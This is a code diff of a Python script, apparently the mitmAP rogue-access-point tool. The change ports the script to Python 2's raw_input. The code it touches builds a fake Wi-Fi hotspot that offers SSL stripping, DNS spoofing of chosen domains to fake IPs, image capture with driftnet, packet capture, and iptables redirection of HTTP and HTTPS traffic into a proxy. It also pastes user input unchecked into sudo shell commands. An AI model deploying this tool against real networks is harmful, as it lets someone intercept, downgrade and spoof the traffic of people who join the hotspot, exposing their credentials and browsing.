@@ -13,9 +13,9 @@ script_path = os.path.dirname(os.path.realpath(__file__))
 script_path = script_path + "/"
 os.system("sudo mkdir " + script_path + "logs > /dev/null 2>&1")
 os.system("sudo chmod 777 " + script_path + "logs")
-
+tshark_if = ""
 #UPDATING
-update = input("[?] Install/Update dependencies? Y/n: ")
+update = raw_input("[?] Install/Update dependencies? Y/n: ")
 update = update.lower()
 if update == "y" or update == "":
     print("[I] Checking/Installing dependencies, please wait...")
@@ -31,8 +31,8 @@ if update == "y" or update == "":
     os.system("sudo pip install pcapy > /dev/null 2>&1")
 #/UPDATING
 
-ap_iface = input("[?] Please enter the name of your wireless interface (for the AP): ")
-net_iface = input("[?] Please enter the name of your internet connected interface: ")
+ap_iface = raw_input("[?] Please enter the name of your wireless interface (for the AP): ")
+net_iface = raw_input("[?] Please enter the name of your internet connected interface: ")
 network_manager_cfg = "[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:" + ap_iface
 print("[I] Backing up NetworkManager.cfg...")
 os.system("sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup")
@@ -43,12 +43,12 @@ os.system("sudo service network-manager restart")
 os.system("sudo ifconfig " + ap_iface + " up")
 
 #SSLSTRIP QUESTION
-sslstrip_if = input("[?] Use SSLSTRIP 2.0? Y/n: ")
+sslstrip_if = raw_input("[?] Use SSLSTRIP 2.0? Y/n: ")
 sslstrip_if = sslstrip_if.lower()
 #/SSLSTRIP QUESTION
 
 #DRIFTNET QUESTION
-driftnet_if = input("[?] Capture unencrypted images with DRIFTNET? Y/n: ")
+driftnet_if = raw_input("[?] Capture unencrypted images with DRIFTNET? Y/n: ")
 driftnet_if = driftnet_if.lower()
 #/DRIFTNET QUESTION
 
@@ -67,20 +67,20 @@ os.system("sudo echo -e '" + dnsmasq_file + "' > /etc/dnsmasq.conf")
 #/DNSMASQ CONFIG
 
 #HOSTAPD CONFIG
-hostapd_config = input("[?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf' Y/n: ")
+hostapd_config = raw_input("[?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf' Y/n: ")
 hostapd_config = hostapd_config.lower()
 if hostapd_config == "y" or hostapd_config == "":
-    ssid = input("[?] Please enter the SSID for the AP: ")
+    ssid = raw_input("[?] Please enter the SSID for the AP: ")
     while True:
-        channel = input("[?] Please enter the channel for the AP: ")
+        channel = raw_input("[?] Please enter the channel for the AP: ")
         if channel.isdigit():
             break
         else:
             print("[!] Please enter a channel number.")
-    hostapd_wpa = input("[?] Enable WPA2 encryption? y/N: ")
+    hostapd_wpa = raw_input("[?] Enable WPA2 encryption? y/N: ")
     hostapd_wpa = hostapd_wpa.lower()
     if hostapd_wpa == "y":
-        wpa_passphrase = input("[?] Please enter the WPA2 passphrase for the AP: ")
+        wpa_passphrase = raw_input("[?] Please enter the WPA2 passphrase for the AP: ")
         hostapd_file_wpa = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + wpa_passphrase + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
         print("[I] Deleting old config file...")
         os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
@@ -109,17 +109,17 @@ os.system("sudo iptables --append FORWARD --in-interface " + ap_iface + " -j ACC
 #/IPTABLES
 
 #SPEED LIMIT
-speed_if = input("[?] Set speed limit for the clients? Y/n: ")
+speed_if = raw_input("[?] Set speed limit for the clients? Y/n: ")
 speed_if = speed_if.lower()
 if speed_if == "y" or speed_if == "":
     while True:
-        speed_down = input("[?] Download speed limit (in KB/s): ")
+        speed_down = raw_input("[?] Download speed limit (in KB/s): ")
         if speed_down.isdigit():
             break
         else:
             print("[!] Please enter a number.")
     while True:
-        speed_up = input("[?] Upload speed limit (in KB/s): ")
+        speed_up = raw_input("[?] Upload speed limit (in KB/s): ")
         if speed_up.isdigit():
             break
         else:
@@ -131,21 +131,21 @@ else:
 #/SPEED LIMIT
 
 #WIRESHARK & TSHARK QUESTION
-wireshark_if = input("[?] Start WIRESHARK on " + ap_iface + "? Y/n: ")
+wireshark_if = raw_input("[?] Start WIRESHARK on " + ap_iface + "? Y/n: ")
 wireshark_if = wireshark_if.lower()
 if wireshark_if != "y" or "":
-    tshark_if = input("[?] Capture packets to .pcap with TSHARK? (no gui needed) Y/n: ")
+    tshark_if = raw_input("[?] Capture packets to .pcap with TSHARK? (no gui needed) Y/n: ")
     tshark_if = tshark_if.lower()
 #/WIRESHARK & TSHARK QUESTION
 #SSLSTRIP MODE
 if sslstrip_if == "y" or sslstrip_if == "":
 
     #SSLSTRIP DNS SPOOFING
-    ssl_dns_if = input("[?] Spoof DNS manually? y/N: ")
+    ssl_dns_if = raw_input("[?] Spoof DNS manually? y/N: ")
     ssl_dns_if = ssl_dns_if.lower()
     if ssl_dns_if == "y":
         while True:
-            ssl_dns_num = input("[?] How many domains do you want to spoof?: ")
+            ssl_dns_num = raw_input("[?] How many domains do you want to spoof?: ")
             if ssl_dns_num.isdigit():
                 break
             else:
@@ -156,8 +156,8 @@ if sslstrip_if == "y" or sslstrip_if == "":
         i = 0
         while int(ssl_dns_num) != i:
             ssl_dns_num_temp = i + 1
-            ssl_dns_domain = input("[?] " + str(ssl_dns_num_temp) + ". domain to spoof (no need for 'www.'): ")
-            ssl_dns_ip = input("[?] Fake IP for domain '" + ssl_dns_domain + "': ")
+            ssl_dns_domain = raw_input("[?] " + str(ssl_dns_num_temp) + ". domain to spoof (no need for 'www.'): ")
+            ssl_dns_ip = raw_input("[?] Fake IP for domain '" + ssl_dns_domain + "': ")
             ssl_dns_domain = ssl_dns_domain.replace("www.", "")
             ssl_dns_line = ssl_dns_domain + " " + ssl_dns_ip + "\n"
             os.system("sudo echo -e '" + ssl_dns_line + "' >> "+ script_path + "src/dns2proxy/spoof.cfg")
@@ -202,11 +202,11 @@ if sslstrip_if == "y" or sslstrip_if == "":
 
 else:
     #DNSMASQ DNS SPOOFING
-    dns_if = input("[?] Spoof DNS? Y/n: ")
+    dns_if = raw_input("[?] Spoof DNS? Y/n: ")
     dns_if = dns_if.lower()
     if dns_if == "y" or dns_if == "":
         while True:
-            dns_num = input("[?] How many domains do you want to spoof?: ")
+            dns_num = raw_input("[?] How many domains do you want to spoof?: ")
             if dns_num.isdigit():
                 break
             else:
@@ -216,8 +216,8 @@ else:
         i = 0
         while int(dns_num) != i:
             dns_num_temp = i + 1
-            dns_domain = input("[?] " + str(dns_num_temp) + ". domain to spoof (no need for 'www.'): ")
-            dns_ip = input("[?] Fake IP for domain '" + dns_domain + "': ")
+            dns_domain = raw_input("[?] " + str(dns_num_temp) + ". domain to spoof (no need for 'www.'): ")
+            dns_ip = raw_input("[?] Fake IP for domain '" + dns_domain + "': ")
             dns_domain = dns_domain.replace("www.", "")
             dns_line = "address=/" + dns_domain + "/" + dns_ip
             os.system("sudo echo -e '" + dns_line + "' >> /etc/dnsmasq.conf")
@@ -232,10 +232,10 @@ else:
     os.system("sudo dnsmasq")
 
     #MITMAP MODE
-    proxy_if = input("[?] Capture traffic? Y/n: ")
+    proxy_if = raw_input("[?] Capture traffic? Y/n: ")
     proxy_if = proxy_if.lower()
     if proxy_if == "y" or proxy_if == "":
-        proxy_config = input("[?] Capture HTTPS traffic too? (Need to install certificate on device) y/N: ")
+        proxy_config = raw_input("[?] Capture HTTPS traffic too? (Need to install certificate on device) y/N: ")
         proxy_config = proxy_config.lower()
         if proxy_config == "n" or proxy_config == "":
             os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
